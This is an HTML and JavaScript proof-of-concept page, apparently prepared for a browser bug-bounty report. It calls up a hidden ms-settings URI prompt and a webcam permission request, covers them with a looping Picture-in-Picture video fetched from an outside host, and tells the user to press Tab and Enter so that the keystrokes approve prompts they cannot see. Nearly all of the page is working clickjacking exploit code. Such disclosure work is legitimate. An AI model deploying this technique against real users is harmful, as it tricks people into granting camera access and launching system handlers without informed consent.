<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC: PiP Obscuration for URI Scheme Prompts (Hypothetical Bypass Variant for VRP)</title>
    <style>
        html { font-family: sans-serif; }
        #instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
        #wrapper {
            position: absolute;
            bottom: 0;
            right: 0px;
        }
        #uriTrigger { display: none; }
        video { display: none; }
    </style>
</head>
<body>
    <h1>PoC: PiP Obscuration for URI Scheme Prompts (e.g., ms-settings) with Timing Bypass Attempt</h1>
    <p>This variant attempts to obscure URI scheme prompts (e.g., ms-settings:bluetooth) using Video PiP, with rapid timing to potentially bypass delay protections. Integrated with webcam for permission test fallback. Test on Windows Chrome pre/post-fix.</p>
    <p id="instructions">Click 'Start Test', then press Tab four times, then Enter three times (simulating bypass delay)</p>
    
    <!-- Webcam for Fallback Permission Test -->
    <video id="webcamPlayer" autoplay playsinline></video>
    <button id="startTestButton">Start Test (Trigger URI Prompt & PiP)</button>
    
    <!-- Hosted Video for PiP Obscuration -->
    <video id="pipVideo" loop>
        <source src="https://0x1337-exploit.github.io/hosting/staging/ado.mp4" type="video/mp4">
    </video>
    
    <div id="wrapper">
        <a id="uriTrigger" href="ms-settings:bluetooth">Trigger URI</a> <!-- Hidden URI trigger -->
    </div>
    
    <script>
        const instructions = document.getElementById('instructions');
        const startTestButton = document.getElementById('startTestButton');
        const webcamVideo = document.getElementById('webcamPlayer');
        const pipVideo = document.getElementById('pipVideo');
        const uriTrigger = document.getElementById('uriTrigger');
        let pipWindow;
        let attemptCount = 0;

        // Start Test: Trigger URI, PiP, and Webcam as Fallback
        startTestButton.addEventListener('click', async () => {
            try {
                // Trigger URI scheme to show prompt (e.g., open Bluetooth settings)
                uriTrigger.click(); // This will trigger the external protocol prompt
                
                // Immediately play video and request PiP to obscure
                pipVideo.play();
                await pipVideo.requestPictureInPicture();
                
                // Fallback: Request webcam permission (if URI fails, test camera)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                webcamVideo.srcObject = stream;
                
                instructions.innerText = 'Press Tab four times, then Enter three times (First closes PiP, others approve hidden prompt)';
                startTestButton.disabled = true;
                
                // Hypothetical timing bypass: Rapid PiP re-open after close
                setTimeout(async () => {
                    if (document.pictureInPictureElement && attemptCount < 2) {
                        await document.exitPictureInPicture();
                        await pipVideo.requestPictureInPicture();
                        attemptCount++;
                    }
                }, 300); // Time to potentially hit before delay kicks in
            } catch (error) {
                alert('Failed: ' + error.message);
            }
        });

        // Handle PiP events for re-obscuration
        pipVideo.addEventListener('enterpictureinpicture', () => {
            pipWindow = document.pictureInPictureElement;
        });
        pipVideo.addEventListener('leavepictureinpicture', () => {
            pipWindow = null;
            // Re-trigger PiP quickly
            setTimeout(() => pipVideo.requestPictureInPicture(), 100);
        });

        // Monitor camera permission as indicator (for fallback)
        setInterval(async () => {
            const permStatus = await navigator.permissions.query({ name: 'camera' });
            if (permStatus.state === 'granted') {
                instructions.innerText = 'Access granted! (Check if URI also triggered)';
            }
        }, 500);
    </script>
</body>
</html>
